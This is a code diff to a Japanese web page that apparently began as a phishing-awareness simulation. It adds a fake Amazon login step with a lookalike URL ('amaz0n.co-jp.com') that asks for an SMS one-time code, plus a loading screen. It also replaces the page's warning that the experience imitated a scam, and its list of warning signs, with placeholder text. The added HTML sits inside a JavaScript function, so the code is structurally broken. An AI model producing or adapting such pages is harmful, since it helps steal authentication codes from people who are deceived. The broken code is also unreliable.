@@ -165,18 +165,37 @@
           showPage(5);
         }, 3000);
       }
+         <div id="page-auth" class="page">
+    <div class="container">
+      <div class="fake-urlbar">https://www.amaz0n.co-jp.com/auth</div>
+      <h2>追加認証が必要です</h2>
+      <p>セキュリティのため、SMSで送信された6桁のコードを入力してください。</p>
+      <input type="text" id="authcode" placeholder="6桁のコードを入力" maxlength="6"/>
+      <button onclick="handleAuth()">認証する</button>
+    </div>
+  </div>
+
+       <!-- ローディングページ -->
+  <div id="page-loading" class="page">
+    <div class="container loading">
+      <div class="fake-urlbar">https://www.amaz0n.co-jp.com/auth</div>
+      <div class="spinner"></div>
+      <p>認証中… 少々お待ちください</p>
+    </div>
+  </div>
+
 
       if (step === 5) {
         page.innerHTML = `
           <div class="warning">
-            ⚠️ これは詐欺の手口を再現した体験でした！
+            ⚠️ 何か入力！
           </div>
           <div class="summary">
-            <p>実際の詐欺サイトにはこんな特徴があります：</p>
+            <p>何か入力：</p>
             <ul>
-              <li>URLが本物に似ているが一部違う</li>
-              <li>「高額ポイント」「限定」など甘い誘い</li>
-              <li>公式サイトでは不要な情報を求める</li>
+              <li>何か入力</li>
+              <li>何か入力</li>
+              <li>何か入力</li>
             </ul>
           </div>
           <button onclick="showPage(6)">次へ</button>
